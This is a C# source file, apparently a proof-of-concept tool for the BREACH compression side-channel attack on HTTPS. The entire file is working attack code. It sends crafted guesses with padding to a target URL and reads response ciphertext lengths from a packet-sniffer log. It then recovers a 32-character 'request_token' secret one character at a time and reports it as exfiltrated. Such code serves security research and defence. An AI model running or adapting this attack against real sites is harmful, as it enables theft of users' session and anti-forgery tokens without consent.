using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace BREACHBasic
{
    partial class Program
    {
        // User-configurable parameters
        static Char[] KeySpace = new Char[] { 
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
        };

        // Sample, non-authenticated HTTPS-enabled endpoint vulnerable to BREACH
        static string TargetURL = "https://malbot.net/poc/?param1=value1&param2=value2&blah";
        static string canary = "request_token='";


        // Internal parameters
        static string PacketLengthLog = Path.Combine(Path.GetTempPath(), "readBytesClosed.txt");
        static int NumberOfRequests = 0;
        static int PADDING_SIZE = 40; // Default
        static int PADDING_SIZE_ADJUSTMENT = 0;

        // Main Driver
        static void Main(string[] args)
        {
            // If requirements do not pass, exit
            if (!CheckRequirements()) return;

            Stopwatch stopWatch = new Stopwatch();
            String knownToken = String.Empty;

            NumberOfRequests = 0;
            PADDING_SIZE = 40;
            PADDING_SIZE_ADJUSTMENT = 0;
            int PADDING_TOP = 300 - PADDING_SIZE;
            int PADDING_BOTTOM = 20 - PADDING_SIZE;

            int AirbagExpansions = 0;
            bool ForceRecoveryMode = false;

            // Initialize
            HttpGet("https://malbot.net/poc/?ae=Item&t=IPM.Note&a=New&id=NALCanary=");
            DeletePacketLog();
            stopWatch.Start();

            do
            {
                string progress = String.Empty;

                char? winner = null;
                bool knownBad = false;
                int? winningMargin = null;
                ArrayList blackListedIntelligence = new ArrayList(16);

                foreach (char c in KeySpace)
                {
                    if (ForceRecoveryMode)
                        break;

                    if (IsCorrectGuess(canary + knownToken, c.ToString(), ref knownBad, ref winningMargin))
                    {
                        WriteConsoleSuccess("[>] The winner is... " + c);

                        if (winner != null)
                        {
                            WriteConsoleError("\n[!] FIRST ROUND COLLISION - We already had a winner!! (" + winner + " vs. " + c + ")");
                            WriteConsoleWarning("Forcing recovery mode.\n");

                            winner = null;
                            ForceRecoveryMode = true;
                            break;
                        }

                        else
                        {
                            winner = c;
                        }
                    }

                    if (knownBad)
                    {
                        blackListedIntelligence.Add(c);
                    }
                }


                if (winner == null && AirbagExpansions < 5)
                {
                    Random myRandom = new Random();
                    PADDING_SIZE_ADJUSTMENT = myRandom.Next(PADDING_BOTTOM, PADDING_TOP);

                    WriteConsoleInfo("[ Brief Airbag Expansion (#" + (AirbagExpansions +1) + " @ " + (PADDING_SIZE + PADDING_SIZE_ADJUSTMENT) + ") ]");
                    AirbagExpansions++;
                    continue;
                }


                // Additional *BASIC* recovery mechanisms
                if (winner == null)
                {

                    WriteConsoleError("\n[!] We could not locate a winner");
                    WriteConsoleWarning("Initiating recovery procedure #1...\n");


                    foreach (char c in KeySpace)
                    {

                        foreach (char d in KeySpace) // could we optimize this loop? break
                        {

                            if (blackListedIntelligence.Contains(d))
                            {
                                Console.Write("  ... " + d + " ... ");
                                continue;
                            }

                            bool knownBad2 = false;
                            if (winner == null &&
                                IsCorrectGuess(canary + knownToken, d.ToString() + c.ToString(), ref knownBad2, ref winningMargin))
                            {
                                WriteConsoleSuccess("[>>] The winner is... " + d);
                            }
                        }

                    }



                }


                if (winner != null)
                {
                    knownToken += winner;
                    AirbagExpansions = 0;
                    PADDING_SIZE_ADJUSTMENT = 0;
                    Console.Title = knownToken;
                }

                Console.WriteLine("\n--- --- ---\n");

            } while (knownToken.Length < 32);


            WriteConsoleSuccess("\n\n\n ------------- GREAT SUCCESS WITH " + NumberOfRequests + " REQUESTS ---------------- " +
                        "\n Secret Exfiltrated (" + stopWatch.Elapsed.Seconds + " sec.) : " + knownToken + "\n");
            Console.Title = "SSL Exfiltration Services...  " + knownToken + " (" + NumberOfRequests + ")";
        }


        // The Oracle
        public static bool IsCorrectGuess(
            String currentCanary,
            String guess,
            ref bool knownBad,
            ref int? winningMargin)
        {
            knownBad = false;
            String padding = String.Empty;
            for (int i = 0; i <= (PADDING_SIZE + PADDING_SIZE_ADJUSTMENT) / 2; i++)
                padding += "{}";

            HttpGet(TargetURL + currentCanary + guess + padding + "@");
            int? bytes1 = ReadBytes();

            int? bytes2 = null;
            HttpGet(TargetURL + currentCanary + padding + guess + "@");
            bytes2 = ReadBytes();

            // If something went wrong with this read, retry one time
            if (bytes1 == null || bytes2 == null || Math.Abs(bytes1.Value - bytes2.Value) > 100)
            {
                HttpGet(TargetURL + currentCanary + guess + padding + "@");
                bytes1 = ReadBytes();
                HttpGet(TargetURL + currentCanary + padding + guess + "@");
                bytes2 = ReadBytes();
            }

            // If bytes1 is smaller than bytes2, we have a winner
            if (bytes1 < bytes2)
            {
                Console.WriteLine("bytes1: " + bytes1 + " ... bytes2: " + bytes2 + " [" + guess + "]");
                winningMargin = bytes2 - bytes1;
                return true;
            }

            // Otherwise this is clearly a false positive
            else if (bytes2 < bytes1)
                knownBad = true;

            return false;
        }


        // Reads the ciphertext response length
        public static int? ReadBytes()
        {
            int errorCount = 0;

            while (!File.Exists(PacketLengthLog))
            {
                Thread.Sleep(1);

                if (++errorCount % 100 == 0)
                    WriteConsoleError("·· CANNOT READ BYTES FAST ENOUGH - (ERR #001)");
            }


            int? result = null;

            do
            {
                try
                {
                    using (StreamReader sr = new StreamReader(File.OpenRead(PacketLengthLog)))
                    {
                        string line = sr.ReadLine();
                        result = Int32.Parse(line);

                        if (result == null)
                        {
                            Thread.Sleep(1);

                            if (++errorCount % 100 == 0)
                                WriteConsoleError("·· READ BYTES FILE CLOSED BUT NOT FLUSHING FAST ENOUGH - (ERR #002)");
                        }
                    }
                }
                catch (IOException)
                {
                    if (++errorCount % 500 == 0)
                        WriteConsoleError("·· RECEIVING TOO MANY I/O EXCEPTIONS - (ERR #003)");
                }

            } while (result == null);


            DeletePacketLog();
            return result;
        }


        // Resets the log between BREACH and the SSL Relay Proxy / packet sniffer
        public static void DeletePacketLog()
        {
            do
            {
                try
                {
                    File.Delete(PacketLengthLog);
                    break;
                }
                catch (IOException)
                {
                    WriteConsoleWarning("## ERR - Cannot delete packet length log");
                    Thread.Sleep(5);
                }
            } while (true);
        }

    }
}
